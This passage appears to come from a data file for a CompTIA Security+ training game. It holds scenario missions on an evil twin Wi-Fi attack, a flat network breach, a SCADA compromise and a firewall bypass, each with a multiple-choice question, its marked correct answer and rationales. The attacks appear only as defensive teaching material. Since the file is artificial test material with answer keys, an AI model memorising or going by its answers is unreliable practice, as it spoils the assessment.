ON-PATH ATTACK defined (formerly "Man-in-the-Middle"):
  - Attacker intercepts communication between two parties
  - Can read, modify, inject, or block traffic
  - Victims believe they're communicating directly with each other
  - Enablers: Rogue WiFi, ARP poisoning, DNS spoofing, BGP hijacking

Related attack: REPLAY ATTACK
  - Attacker captures legitimate authentication packets
  - Replays them later to impersonate the user
  - Prevention: Nonces (one-time tokens), timestamps, session IDs`,
        critical: true
      },
      {
        id: 'wireless-03',
        type: 'report',
        label: 'Wireless & Network Attack Types',
        content: `WIRELESS ATTACKS (CompTIA 2.4):

EVIL TWIN:
  - Rogue AP mimicking legitimate network
  - Intercepts traffic (on-path attack)
  - Prevention: 802.1X authentication (WPA2/3 Enterprise), SSID monitoring, user awareness

DEAUTHENTICATION ATTACK:
  - Sends deauth frames to disconnect clients from legitimate AP
  - Forces reconnection (can capture handshake for password cracking)
  - Can force clients to connect to Evil Twin
  - Prevention: 802.11w (Management Frame Protection)

ROGUE ACCESS POINT:
  - Unauthorized AP on the network (accidental or malicious)
  - Bypasses network security controls
  - Prevention: Wireless IDS/IPS, NAC (Network Access Control)

---

NETWORK ATTACKS:

ON-PATH (MAN-IN-THE-MIDDLE):
  - Intercepts communication between two parties
  - Methods: Rogue WiFi, ARP spoofing, DNS poisoning
  - Impact: Credential theft, data interception, traffic modification

REPLAY ATTACK:
  - Captures and retransmits valid authentication packets
  - Prevention: Nonces, timestamps, session tokens

DoS / DDoS (Denial of Service):
  - DoS: Single attacker overwhelms target
  - DDoS: Distributed attack from many sources (botnet)
  - Types: SYN flood, UDP flood, amplification attacks
  - Prevention: Rate limiting, firewalls, DDoS mitigation services

PASSWORD ATTACKS:
  - Brute force: Try all possible passwords
  - Spraying: Try common passwords against many accounts (avoids lockout)
  - Rainbow tables: Pre-computed hash lookups
  - Prevention: Strong passwords, MFA, account lockout, salted hashes

---

CRYPTOGRAPHIC ATTACKS:

BIRTHDAY ATTACK:
  - Exploits hash collision probability
  - Finds two inputs that produce the same hash

DOWNGRADE ATTACK:
  - Forces use of weaker encryption (SSL 3.0 instead of TLS 1.3)
  - Prevention: Disable legacy protocols

COLLISION ATTACK:
  - Finds two different inputs with the same hash output
  - Undermines integrity verification`,
        critical: false
      },
      {
        id: 'wireless-04',
        type: 'log',
        label: 'Indicators of Compromise',
        content: `INDICATORS OF COMPROMISE (CompTIA 2.4):

Impossible Travel:
  - User login from New York at 2 PM, then Tokyo at 2:10 PM (physically impossible)
  - Indicates credential theft
  - NOT observed in this incident (attacker is on-site)

Concurrent Session Anomalies:
  - Same user logged in from two locations simultaneously
  - Observed: User "jsmith" authenticated from Evil Twin AP and legitimate office desktop at the same time
  - Strong indicator of credential compromise

Resource Consumption:
  - Unusual CPU, memory, network, or disk usage
  - Can indicate malware, cryptomining, DDoS participation
  - NOT observed (attack focused on interception, not resource abuse)

Account Lockout:
  - Multiple failed login attempts
  - Indicates brute force or password spraying attack
  - NOT observed (attacker captured valid credentials via MitM)

Missing Logs:
  - Gaps in security logs
  - Indicates attacker covered their tracks
  - Observed: Evil Twin AP kept no logs (attacker controlled device)

---

CURRENT INCIDENT INDICATORS:
  ✓ Concurrent sessions: Users authenticated through both legitimate and rogue AP
  ✓ Certificate warnings: Reported by 23 users
  ✓ Rogue AP detection: Wireless IDS flagged unauthorized BSSID
  ✓ Unusual network topology: Traffic routing through unexpected gateway
  ✓ VPN connection failures: MitM breaking VPN establishment`,
        critical: false
      },
      {
        id: 'wireless-05',
        type: 'witness',
        label: 'Employee Statements',
        content: `Interview with affected employees:

Employee 1 (Accounting):
"I connected to the WiFi like I do every morning. I tried to access the finance portal and got a certificate warning. I've seen those before when the SSL cert expires, so I clicked through it. I entered my username and password. The page loaded slowly, but it worked. I had no idea I wasn't on the real network."

Employee 2 (Engineering):
"My laptop auto-connected to 'CorpNet-Secure' when I arrived at the office. I noticed my VPN client kept failing to connect, showing 'handshake error'. I restarted my laptop and tried again. Eventually I gave up and worked without VPN. I didn't realize the WiFi itself was compromised."

Employee 3 (IT):
"I got a certificate warning for an internal site that I KNOW has a valid certificate. That's when I reported it to the SOC. A legitimate internal site with a valid cert should never show a warning — that's a clear sign of MitM. I refused the connection and immediately switched to Ethernet."

Physical search outcome:
Security team found the rogue AP hidden in a conference room ceiling tile on Floor 3, southeast corner. It was a battery-powered portable device (WiFi Pineapple), running for approximately 6 hours before discovery. No fingerprints. Attacker likely gained physical access by tailgating (following an employee through the door without badging).`,
        critical: false
      }
    ],

    challenge: {
      question: 'Employees reported SSL certificate warnings when accessing internal sites. What does this indicator reveal about the attack?',
      options: [
        'The attacker performed a DDoS attack overwhelming the web servers',
        'The attacker is conducting an on-path attack intercepting HTTPS traffic',
        'The company\'s SSL certificates expired and need renewal',
        'The attacker deployed ransomware encrypting SSL certificates'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: DDoS attacks overwhelm servers causing timeouts or slow performance, not certificate warnings. Certificate errors indicate trust/encryption issues, not availability problems.',
        'CORRECT: When legitimate internal sites with valid certificates show warnings, it means someone is intercepting the HTTPS connection and presenting a fraudulent certificate. This is the hallmark of an on-path (MitM) attack. The attacker\'s Evil Twin AP intercepted traffic and tried to impersonate the internal sites using self-signed certificates, triggering browser warnings.',
        'INCORRECT: If certificates expired, IT would know and renew them across all servers simultaneously. The sudden appearance of warnings on previously working sites, combined with the rogue AP discovery, confirms active interception, not expiration.',
        'INCORRECT: Ransomware encrypts data files, not SSL certificates. Certificate warnings indicate interception or trust chain issues, not file encryption.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 2.4: Network and Wireless Attacks. The Evil Twin attack enabled an on-path (MitM) position, intercepting credentials and sensitive data.

Key concepts learned:
  - Evil Twin: Rogue AP mimicking legitimate WiFi to intercept traffic
  - On-path attack (MitM): Intercepting communication between two parties
  - Wireless attacks: Evil twin, deauthentication, rogue AP
  - SSL certificate warnings are critical indicators of on-path attacks
  - Network attacks: DoS/DDoS, replay attacks, password attacks (brute force, spraying, rainbow tables)
  - Cryptographic attacks: Birthday attack, downgrade attack, collision attack
  - Indicators of compromise: Impossible travel, concurrent sessions, resource consumption, account lockout, missing logs
  - Defenses: WPA2/3 Enterprise (802.1X), wireless IDS, certificate pinning, user awareness, MFA`,

    escalation: `The rogue AP operated for 6 hours before discovery. 47 employees connected to it, and 23 entered credentials after ignoring certificate warnings. The attacker captured:
  - 23 sets of domain credentials
  - 12 VPN credentials
  - Session tokens for internal applications
  - Emails and file transfers

All compromised accounts were immediately reset. The attacker used 3 sets of captured admin credentials to access internal file shares, exfiltrating 340 MB of confidential project data before detection. Estimated cost: $230,000 in incident response, forensics, and breach notification. The attacker was never identified — likely an insider threat or sophisticated external attacker with physical access. Security deployed continuous wireless monitoring, disabled SSID broadcasting, implemented 802.1X authentication, and mandated certificate pinning for all corporate applications.`,

    refs: [
      { source: 'Study Guide', section: '2.4 - Network Attacks', page: 39 },
      { source: 'Study Guide', section: '2.4 - Wireless Attacks', page: 40 },
      { source: 'Study Guide', section: '2.4 - Indicators of Compromise', page: 41 }
    ]
  },

  // ============================================================
  // DOMAIN 2 — Threats, Vulnerabilities, Mitigations (Obj 2.5)
  // Teaches: Mitigation Techniques, Hardening, Segmentation
  // ============================================================
  {
    id: 'MISSION-017',
    title: 'The Flat Network',
    domain: 'Threats, Vulnerabilities, Mitigations',
    objectiveCodes: ['2.5'],
    threatLevel: 'high',
    tags: ['Mitigation', 'Hardening', 'Segmentation', 'Network Security', 'Configuration'],
    briefing: `POST-BREACH ASSESSMENT: Last week, an attacker compromised a single employee workstation through a phishing email. Within 36 hours, they had access to the CEO\'s files, customer databases, financial systems, and R&D servers. The attack succeeded not because of sophisticated techniques, but because your network is completely flat — no segmentation, no hardening, no defense-in-depth. The board has given you 30 days and a $400K budget to implement proper mitigation controls. Your first task: Assess the damage and create a mitigation roadmap.`,

    intel: [
      {
        id: 'mitigate-01',
        type: 'forensic',
        label: 'Attack Path Analysis',
        content: `LATERAL MOVEMENT TIMELINE:

Hour 0 — Initial Compromise:
  - Employee workstation infected via phishing (macro-enabled document)
  - Malware established C2 connection

Hour 2 — Network Reconnaissance:
  - Attacker scanned entire 10.0.0.0/16 network (65,534 possible hosts)
  - NO network segmentation detected
  - All devices on single flat network: workstations, servers, printers, IoT, databases

Hour 4 — Credential Harvesting:
  - Keylogger captured local admin password (same on all workstations)
  - Used default password to access network shares

Hour 8 — Privilege Escalation:
  - Accessed Domain Controller (no firewall rules restricting access)
  - Exploited unpatched vulnerability CVE-2023-21746 (missing patches)
  - Obtained domain admin credentials

Hour 12 — Lateral Movement to Crown Jewels:
  - Accessed file server: CEO documents, HR files
  - Accessed SQL database server: Customer PII, payment data
  - Accessed R&D server: Unreleased product specifications
  - NO access controls beyond username/password (same credentials worked everywhere)

Hour 36 — Data Exfiltration Complete:
  - 14 GB of sensitive data exfiltrated
  - No DLP (Data Loss Prevention) to block/alert
  - No SIEM correlation to detect mass data access
  - No egress filtering to block outbound data transfers

ROOT CAUSE: FLAT NETWORK
  - All systems on one network segment
  - No VLANs to isolate workstations from servers
  - No ACLs (Access Control Lists) to restrict traffic
  - Any compromised device can reach any other device`,
        critical: true
      },
      {
        id: 'mitigate-02',
        type: 'report',
        label: 'Security Hardening Failures Identified',
        content: `HARDENING GAPS DISCOVERED:

ENDPOINT HARDENING (Missing):
  ❌ No EDR (Endpoint Detection & Response) deployed
  ❌ No HIPS (Host-based Intrusion Prevention System)
  ❌ Windows Defender disabled on 40% of workstations
  ❌ No host-based firewall rules configured (Windows Firewall disabled)
  ❌ Unnecessary software installed (Java, Flash, old versions)
  ❌ Default passwords on local admin accounts (same across all systems)
  ❌ Open ports not required for business function (SMBv1, Telnet, FTP)

SERVER HARDENING (Missing):
  ❌ Unpatched vulnerabilities (last patch cycle: 9 months ago)
  ❌ Unnecessary services running (Print Spooler on database server)
  ❌ Default configurations unchanged
  ❌ Root/Administrator login allowed remotely
  ❌ No file integrity monitoring
  ❌ No application whitelisting

NETWORK HARDENING (Missing):
  ❌ No network segmentation (flat network)
  ❌ No VLANs separating users, servers, IoT, guest WiFi
  ❌ No firewall ACLs between zones
  ❌ No intrusion detection/prevention system (IDS/IPS)
  ❌ No egress filtering (outbound traffic unrestricted)

HARDENING = Reducing attack surface by:
  - Removing unnecessary software, services, ports
  - Changing default passwords and configurations
  - Applying patches and updates
  - Implementing least privilege
  - Deploying security agents (EDR, HIPS, firewall)
  - Enforcing configuration standards`,
        critical: true
      },
      {
        id: 'mitigate-03',
        type: 'report',
        label: 'Mitigation Techniques (CompTIA 2.5)',
        content: `MITIGATION CONTROLS (CompTIA 2.5):

SEGMENTATION:
  - Divide network into isolated zones using VLANs
  - Implement firewall ACLs between zones
  - Restrict traffic: users can't directly access database servers
  - Zones: User VLAN, Server VLAN, DMZ, Management VLAN, Guest VLAN
  - Prevents lateral movement: Compromised workstation can't reach servers

PATCHING:
  - Regularly apply security updates to OS, applications, firmware
  - Automated patch management system
  - Test patches in staging before production deployment
  - Emergency patching process for critical vulnerabilities (CVSS 9.0+)

ENCRYPTION:
  - Data at rest: Full-disk encryption (BitLocker, FileVault)
  - Data in transit: TLS 1.3, VPN, encrypted protocols (HTTPS, SSH, SFTP)
  - Protects confidentiality even if storage or network is compromised

MONITORING:
  - SIEM (Security Information & Event Management): Centralized log collection and correlation
  - Sensors/Collectors: EDR agents, network taps, log forwarders
  - Alerting on suspicious patterns: Failed logins, privilege escalation, mass file access
  - This network had NO centralized monitoring

LEAST PRIVILEGE:
  - Users/services get ONLY the minimum access needed
  - No domain admin for daily tasks
  - Separate accounts: Standard user + admin (used only when needed)
  - Reduces blast radius of compromise

CONFIGURATION ENFORCEMENT:
  - Baseline security configurations for all systems
  - Group Policy (Windows), Configuration Management (Ansible, Chef, Puppet)
  - Automated compliance scanning
  - Prevents configuration drift

DECOMMISSIONING:
  - Properly remove end-of-life systems
  - Securely wipe data
  - Revoke certificates, credentials
  - Outdated systems = unpatched vulnerabilities

HARDENING TECHNIQUES:
  - EDR: Behavioral threat detection on endpoints
  - HIPS: Blocks malicious activity on hosts
  - Host-based firewall: Controls network access per system
  - Remove unnecessary software: Reduces attack surface
  - Change default passwords: Prevents credential reuse attacks
  - Close open ports: Block unused services (disable SMBv1, Telnet)`,
        critical: false
      },
      {
        id: 'mitigate-04',
        type: 'alert',
        label: 'Recommended Mitigation Roadmap',
        content: `30-DAY MITIGATION PLAN:

IMMEDIATE (Week 1):
  ✓ Deploy EDR to all endpoints (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint)
  ✓ Enable host-based firewalls with deny-all default, allow only required traffic
  ✓ Change all default passwords (local admin, service accounts, network devices)
  ✓ Apply critical security patches (CVSS 9.0+)
  ✓ Deploy SIEM and configure log forwarding from all systems

SHORT-TERM (Weeks 2-3):
  ✓ Implement network segmentation:
    - VLAN 10: User workstations
    - VLAN 20: Servers (file, app, database)
    - VLAN 30: Management (AD, SIEM, backup)
    - VLAN 40: DMZ (public-facing services)
    - VLAN 50: Guest WiFi (isolated)
  ✓ Configure firewall ACLs between VLANs (deny by default, allow specific flows)
  ✓ Deploy IPS (Intrusion Prevention System) at network perimeter and between zones
  ✓ Implement least privilege: Remove domain admin from daily-use accounts
  ✓ Enable BitLocker full-disk encryption on all endpoints
  ✓ Remove unnecessary software and close unused ports

ONGOING (Week 4+):
  ✓ Establish patch management process (monthly cycle, emergency process)
  ✓ Deploy configuration management (Group Policy, Intune)
  ✓ Implement file integrity monitoring (FIM) on critical servers
  ✓ Application whitelisting on servers
  ✓ DLP (Data Loss Prevention) policies to prevent exfiltration
  ✓ Security awareness training for employees
  ✓ Regular vulnerability scanning and remediation
  ✓ Decommission 7 end-of-life Windows Server 2008 systems (no longer supported)

ESTIMATED COSTS:
  - EDR licenses: $120K/year
  - SIEM (Splunk/ELK): $80K setup + $40K/year
  - Network equipment (switches, firewalls): $60K
  - Professional services (implementation): $100K
  Total: ~$400K (within budget)`,
        critical: false
      },
      {
        id: 'mitigate-05',
        type: 'witness',
        label: 'CISO Debrief',
        content: `CISO statement to the board:

"This breach succeeded not because the attacker was sophisticated, but because our defenses were nonexistent. We had no network segmentation, no endpoint protection, no monitoring, and no hardening. A single compromised workstation became a launch point for accessing every system in the organization.

The concept of defense-in-depth means layering multiple controls so that if one fails, others still protect you. We had no layers. When the phishing email bypassed email filtering, there was nothing else to stop the attacker.

The flat network design is indefensible in 2024. Industry best practices — and compliance frameworks like PCI-DSS, NIST, and ISO 27001 — all require network segmentation. We ignored those standards.

Here's what would have stopped or slowed this attack:

  - Segmentation: Workstations on a separate VLAN from servers → attacker couldn't reach databases from a compromised laptop
  - EDR: Behavioral detection would have flagged the malware before lateral movement
  - Least privilege: Domain admin credentials wouldn't have been on a user workstation
  - Patching: The privilege escalation exploit was patched 9 months ago
  - Monitoring: SIEM would have alerted on reconnaissance scanning and mass file access
  - Hardening: Removing default passwords and closing unnecessary ports reduces attack surface

We're implementing all of these controls in the next 30 days. We're also conducting a third-party security assessment to identify any remaining gaps. The board should expect quarterly progress reports on our security posture.

This will never happen again."`,
        critical: false
      }
    ],

    challenge: {
      question: 'What is the MOST effective mitigation to prevent lateral movement from a compromised workstation to critical servers?',
      options: [
        'Purchasing cybersecurity insurance to transfer financial risk',
        'Implementing network segmentation with VLANs and firewall ACLs',
        'Conducting annual security awareness training for employees',
        'Installing antivirus software on all workstations'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Cyber insurance transfers financial consequences of a breach but does not prevent lateral movement. It\'s a financial control, not a technical mitigation. The attacker would still move freely across the flat network.',
        'CORRECT: Network segmentation divides the network into isolated zones (VLANs) with firewall rules controlling traffic between them. A compromised workstation on VLAN 10 (users) cannot directly access servers on VLAN 20 unless explicitly allowed by ACL. This containment prevents lateral movement and limits blast radius. This is the #1 architectural defense against lateral movement.',
        'INCORRECT: Security awareness training reduces the likelihood of initial compromise (e.g., fewer phishing victims) but does nothing to stop lateral movement AFTER a device is compromised. It\'s a preventive control for user behavior, not a technical barrier to network traversal.',
        'INCORRECT: Antivirus detects known malware signatures but often fails against custom malware, fileless attacks, or techniques like credential reuse. It doesn\'t restrict network access — a compromised workstation with AV can still reach servers on a flat network. Segmentation is a stronger architectural control.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 2.5: Mitigation Techniques. A flat network with no hardening enabled rapid lateral movement from a single compromised workstation to the entire infrastructure.

Key concepts learned:
  - Segmentation: VLANs and ACLs isolate network zones, preventing lateral movement
  - Hardening: Reduce attack surface by removing unnecessary software/services/ports, changing defaults, deploying security agents (EDR, HIPS, host firewall)
  - Patching: Regularly apply security updates to close known vulnerabilities
  - Encryption: Protect data at rest (BitLocker) and in transit (TLS, VPN)
  - Monitoring: SIEM with sensors/collectors for centralized log analysis and alerting
  - Least privilege: Minimize access rights to reduce compromise impact
  - Configuration enforcement: Automated baselines prevent drift
  - Decommissioning: Remove end-of-life systems to eliminate unpatched risks
  - Defense-in-depth: Layer multiple controls so single point of failure doesn't doom entire system`,

    escalation: `The flat network enabled full infrastructure compromise from a single phishing email. 14 GB of sensitive data was exfiltrated including customer PII, financial records, and unreleased product specifications. Regulatory fines for data protection violations: $890,000. Customer lawsuits pending. Competitive damage from leaked product roadmaps: estimated $3.2M in lost market advantage. The CISO was replaced. The new security leadership implemented the 30-day mitigation plan, deployed EDR, segmented the network, and hired a red team to continuously test defenses. The company now undergoes quarterly third-party security assessments and maintains SOC 2 Type II compliance.`,

    refs: [
      { source: 'Study Guide', section: '2.5 - Mitigation Techniques', page: 42 },
      { source: 'Study Guide', section: '2.5 - Segmentation', page: 43 },
      { source: 'Study Guide', section: '2.5 - Hardening Techniques', page: 44 }
    ]
  },

// ============================================================
  // DOMAIN 3 — Security Architecture (Obj 3.1)
  // Teaches: Network Infrastructure, Virtualization, VLANs, IoT Security, SCADA/ICS
  // ============================================================
  {
    id: 'MISSION-018',
    title: 'The Factory Floor Breach',
    domain: 'Security Architecture',
    objectiveCodes: ['3.1'],
    threatLevel: 'critical',
    tags: ['SCADA', 'IoT', 'Network Segmentation', 'VLANs', 'ICS'],
    briefing: `CRITICAL ALERT: Manufacturing operations at your automotive plant have halted. At 03:47 UTC, the SCADA system controlling assembly line robotics began executing erratic commands — welding arms moving at unsafe speeds, conveyor belts reversing direction. No operators initiated these changes. Security logs show network traffic from 47 compromised IoT temperature sensors flooding the industrial control network. Your incident response team needs to understand how sensors designed to monitor heat became weapons against production systems.`,

    intel: [
      {
        id: 'factory-01',
        type: 'forensic',
        label: 'Network Topology Analysis',
        content: `NETWORK ARCHITECTURE REVIEW:

Current configuration — FLAT NETWORK:
  - Corporate IT (200 workstations, file servers, email)
  - IoT sensors (47 temperature monitors on factory floor)
  - SCADA/ICS controllers (assembly line robotics)
  - ALL devices on VLAN 1 (default VLAN, no segmentation)

A VLAN (Virtual Local Area Network) creates logical network segments. Even though devices are on the same physical switch, VLANs isolate them at Layer 2. Traffic in VLAN 10 cannot directly reach VLAN 20 without passing through a router with explicit allow rules.

CRITICAL FINDING: Your IoT sensors and SCADA controllers share the same broadcast domain as employee laptops. No firewall. No ACLs. A compromised sensor has direct Layer 2 access to industrial control systems.

This violates fundamental ICS security principles:
  - Physical isolation: Critical systems on separate physical networks (best, but expensive)
  - Logical segmentation: VLANs + firewall rules between zones (good, practical)
  - Your setup: No separation whatsoever (dangerous)`,
        critical: true
      },
      {
        id: 'factory-02',
        type: 'log',
        label: 'IoT Device Configuration Dump',
        content: `SENSOR ANALYSIS — TempGuard Model TG-4400:

Default credentials found on all 47 devices:
  Username: admin
  Password: admin
  Web interface: Port 80 (HTTP, no encryption)
  Telnet: Port 23 (enabled, no auth required)
  Firmware: v1.2.3 (released 2019, 14 CVEs, no updates available)

IoT Security Considerations:
  - Weak default credentials: Manufacturers ship devices with known default passwords. Many users never change them.
  - No security patches: Embedded systems often lack update mechanisms or vendor support ends quickly.
  - Unnecessary services: Telnet, FTP, debug ports left enabled in production.
  - No encryption: Plain-text protocols (HTTP, Telnet) expose credentials and data.

Attack timeline reconstruction:
  03:12 — Shodan scan identifies your sensors (internet-facing on misconfigured port forward)
  03:15 — Attacker logs in using admin/admin
  03:18 — Malware uploaded via HTTP management interface
  03:47 — Sensors begin sending spoofed Modbus commands to SCADA PLCs`,
        critical: true
      },
      {
        id: 'factory-03',
        type: 'report',
        label: 'SCADA Security Assessment',
        content: `SCADA/ICS FUNDAMENTALS:

SCADA = Supervisory Control and Data Acquisition
ICS = Industrial Control Systems (broader category)

Components in your environment:
  - HMI (Human-Machine Interface): Operator workstations
  - PLCs (Programmable Logic Controllers): Control robots/machinery
  - RTUs (Remote Terminal Units): Collect sensor data
  - Protocol: Modbus TCP (industry standard, NO built-in authentication)

SCADA Security Challenges:
  1. Legacy systems: Controllers running 10-year-old OS, can't be patched
  2. Operational continuity: Cannot reboot a PLC controlling a $2M assembly line without scheduled downtime
  3. Proprietary protocols: Modbus, DNP3, and others designed without security in mind (pre-internet era)
  4. Vendor support: Many ICS vendors provide limited or no security updates

Recommended controls when patching isn't possible:
  - Network segmentation (VLANs with strict ACLs)
  - Unidirectional gateways (data flows OUT of SCADA zone, nothing flows IN)
  - Air-gapped networks (physical isolation from corporate IT)
  - Intrusion Detection Systems tuned for ICS protocols`,
        critical: false
      },
      {
        id: 'factory-04',
        type: 'intercepted',
        label: 'Malware Analysis Report',
        content: `SAMPLE: ICS_Disruptor.bin

Capabilities discovered:
  - Modbus command injection: Sends crafted packets to PLCs
  - Command forging: Mimics legitimate HMI traffic
  - Lateral movement: Scans local subnet for additional Modbus devices
  - Persistence: Survives sensor reboots (written to flash memory)

Attack vector: The malware exploited the FLAT NETWORK topology. After compromising one IoT sensor, it scanned the entire subnet and found SCADA controllers at IP addresses 10.0.1.50-10.0.1.67. Because there was no VLAN separation, the sensor could send packets directly to the PLCs.

If proper segmentation existed:
  - IoT sensors: VLAN 30 (monitored, restricted outbound)
  - SCADA/ICS: VLAN 10 (isolated, deny-all inbound except from HMI)
  - Corporate IT: VLAN 20 (standard business network)
  - Firewall rules: IoT → SCADA traffic = BLOCKED

The malware would still compromise the sensors, but it could not reach the PLCs. Attack contained.`,
        critical: false
      },
      {
        id: 'factory-05',
        type: 'alert',
        label: 'Comparative Analysis: Virtualization vs. Containerization',
        content: `TECHNOLOGY CONTEXT (NOT directly related to this attack, but relevant to architecture design):

Virtualization:
  - Runs multiple isolated virtual machines (VMs) on one physical server
  - Each VM has its own OS (hypervisor manages them)
  - Strong isolation (Type 1 hypervisor sits directly on hardware)
  - Use case: Hosting different OS types, legacy app isolation
  - Example: VMware ESXi, Hyper-V, KVM

Containerization:
  - Runs multiple isolated containers sharing one OS kernel
  - Lighter weight than VMs (no separate OS per container)
  - Uses namespaces and cgroups for isolation (weaker than VMs)
  - Use case: Microservices, rapid deployment, dev/test environments
  - Example: Docker, Kubernetes

For SCADA environments, virtualization is preferred for critical controllers because:
  - Stronger isolation between workloads
  - Better suited for legacy OS requirements (Windows XP, older Linux)

However, the PRIMARY lesson here is network segmentation — whether physical, virtual, or containerized, SCADA must be logically isolated from general IT and IoT networks.`,
        critical: false
      }
    ],

    challenge: {
      question: 'Based on your investigation, what is the PRIMARY security control that would have prevented this attack?',
      options: [
        'Implementing containerization for all IoT sensor firmware',
        'Deploying antivirus software on all SCADA controllers',
        'Segmenting IoT devices and SCADA systems into separate VLANs with firewall rules',
        'Replacing all IoT sensors with virtualized sensor software'
      ],
      correctIndex: 2,
      rationales: [
        'INCORRECT: Containerization is a deployment model for applications, not a security control for network isolation. Even containerized sensors on the same network can still reach SCADA systems without proper segmentation.',
        'INCORRECT: Traditional antivirus is ineffective on SCADA controllers running legacy OS versions and proprietary protocols. Many ICS vendors explicitly forbid installing third-party security software due to stability concerns. Prevention (segmentation) is better than detection here.',
        'CORRECT: Network segmentation using VLANs creates logical isolation between IoT devices and SCADA systems. Firewall ACLs between VLANs enforce strict rules — even if IoT sensors are compromised, they cannot send traffic to the SCADA zone. This is the foundational control for ICS security.',
        'INCORRECT: Virtualization might help manage sensor workloads, but it does not address the network-level access problem. Virtualized sensors on the same flat network would have the same attack surface.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 3.1: Network Infrastructure and Virtualization. The attack succeeded because IoT devices and SCADA controllers shared an unsegmented network.

Key concepts learned:
  - VLANs provide logical segmentation — Layer 2 isolation without separate physical networks
  - Physical isolation (air-gapping) is strongest but expensive; logical segmentation is practical
  - IoT devices have weak security (default credentials, no patching, plain-text protocols)
  - SCADA/ICS systems use legacy protocols (Modbus, DNP3) with no authentication
  - Embedded systems (sensors, controllers) often cannot be patched — compensating controls required
  - SDN (Software-Defined Networking) separates control plane, data plane, and management plane for programmable network security

The lesson: SCADA and IoT must NEVER share a network segment with general IT. Use VLANs + ACLs as minimum segmentation.`,

    escalation: `The attack caused 14 hours of production downtime. Three assembly lines were completely halted while control systems were forensically imaged and rebuilt. Manufacturing losses: $870,000. Contractual penalties for late deliveries: $1.2M. The board mandates an immediate network redesign with SCADA isolated into a separate VLAN, all IoT devices on a monitored DMZ segment, and a 6-month security assessment of all embedded systems.`,

    refs: [
      { source: 'Study Guide', section: '3.1 - Network Infrastructure', page: 42 },
      { source: 'Study Guide', section: '3.1 - Segmentation and VLANs', page: 44 },
      { source: 'Study Guide', section: '3.1 - SCADA and ICS Security', page: 47 }
    ]
  },

  // ============================================================
  // DOMAIN 3 — Security Architecture (Obj 3.2)
  // Teaches: IDS/IPS, Network Appliances, Firewalls, Port Security
  // ============================================================
  {
    id: 'MISSION-019',
    title: 'The Silent Bypass',
    domain: 'Security Architecture',
    objectiveCodes: ['3.2'],
    threatLevel: 'high',
    tags: ['IPS', 'IDS', 'Firewall', 'Network Appliances', 'Port Security'],
    briefing: `SECURITY INCIDENT: Your e-commerce platform was breached despite a perimeter firewall and an intrusion prevention system (IPS). At 22:14 UTC, the attacker exfiltrated 18GB of customer data through port 8443. Your IPS never triggered an alert. The firewall logged the traffic as "allowed." Your CISO is furious — "We spent $300K on security appliances and they did nothing." Your job: explain how the attacker bypassed both layers and what went wrong with the defense architecture.`,

    intel: [
      {
        id: 'bypass-01',
        type: 'log',
        label: 'Firewall Rule Analysis',
        content: `FIREWALL CONFIGURATION REVIEW — Palo Alto PA-5000:

Rule ID 47 (added 8 months ago):
  Source: ANY
  Destination: 10.10.50.15 (web server)
  Service: TCP/8443
  Action: ALLOW
  Deep Packet Inspection: DISABLED
  Application-ID: ANY
  Logging: Connection start only

This rule was added during a troubleshooting session for a third-party API integration. The developer said, "We need port 8443 open for webhooks." The firewall admin created a permissive rule without understanding what traffic would actually use it.

FIREWALL TYPES:
  - Traditional/Stateful Firewall: Inspects IP, port, protocol (Layer 3-4). Allows or blocks based on these attributes.
  - Next-Generation Firewall (NGFW): Inspects application-layer data (Layer 7). Can identify specific apps (SSH, HTTPS, custom protocols) regardless of port. Includes deep packet inspection, IPS, SSL decryption.

Your firewall is an NGFW, but this rule bypassed all advanced features by:
  - Allowing ANY application on port 8443 (should have restricted to specific app)
  - Disabling deep packet inspection (DPI examines payload, not just headers)
  - No SSL decryption (attacker used encrypted tunnel — firewall saw encrypted blob, allowed it)`,
        critical: true
      },
      {
        id: 'bypass-02',
        type: 'forensic',
        label: 'IPS Configuration Audit',
        content: `IPS DEPLOYMENT ANALYSIS:

Your IPS (Intrusion Prevention System) is deployed in INLINE mode between the firewall and the internal network. In this mode, ALL traffic passes through the IPS, which can drop malicious packets in real-time.

IPS Detection Methods:
  1. Signature-based: Matches traffic against known attack patterns (like antivirus signatures)
     - Pro: High accuracy for known threats
     - Con: Misses zero-day attacks and novel techniques

  2. Anomaly-based: Establishes baseline "normal" behavior, alerts on deviations
     - Pro: Can detect unknown attacks
     - Con: Higher false positive rate, requires tuning

Your IPS uses signature-based detection. It has 47,000 signatures for known exploits, SQL injection patterns, malware C2 beacons, etc.

THE PROBLEM:
  The attacker exfiltrated data over port 8443 using a legitimate HTTPS connection. The traffic pattern:
  - Valid SSL/TLS handshake
  - Encrypted payload (IPS cannot inspect without SSL decryption)
  - Low-and-slow exfiltration (5 Mbps over 8 hours)
  - No signature match because the attack wasn't exploiting a vulnerability — it was authorized access using stolen credentials

IPS saw: "Encrypted traffic on an allowed port. No signatures matched. Pass."`,
        critical: true
      },
      {
        id: 'bypass-03',
        type: 'report',
        label: 'Network Appliances Overview',
        content: `NETWORK SECURITY APPLIANCES IN YOUR ENVIRONMENT:

1. Firewall (NGFW):
   - Function: Controls traffic flow between network segments
   - Operates: Layer 3-7 (IP, port, application)
   - This incident: Rule was too permissive, DPI disabled

2. IPS (Intrusion Prevention System):
   - Function: Detects and blocks malicious traffic inline
   - Operates: Signature-based + anomaly-based detection
   - This incident: Cannot inspect encrypted traffic, no anomaly baseline

3. Proxy Server (Forward Proxy):
   - Function: Intermediary for outbound connections, caches content, enforces policy
   - Operates: Application layer (HTTP/HTTPS)
   - Your environment: NOT deployed (users connect directly to internet)
   - Missed opportunity: Proxy could have decrypted SSL, applied URL filtering, logged full sessions

4. Jump Server (Bastion Host):
   - Function: Secure gateway for admin access to sensitive systems
   - Operates: Administrators SSH to jump server first, then to target systems
   - Your environment: Production servers accept SSH from any internal IP
   - Missed opportunity: Jump server with MFA and session recording

5. Load Balancer:
   - Function: Distributes traffic across multiple servers
   - Operates: Layer 4 (TCP) or Layer 7 (HTTP)
   - Your environment: Deployed for web tier, but not inspecting for data exfiltration

The attacker bypassed your defenses by exploiting the GAP between appliances — firewall allowed the port, IPS couldn't decrypt the payload, no proxy enforced egress filtering.`,
        critical: false
      },
      {
        id: 'bypass-04',
        type: 'alert',
        label: 'Port Security and 802.1X Analysis',
        content: `PHYSICAL NETWORK ACCESS REVIEW:

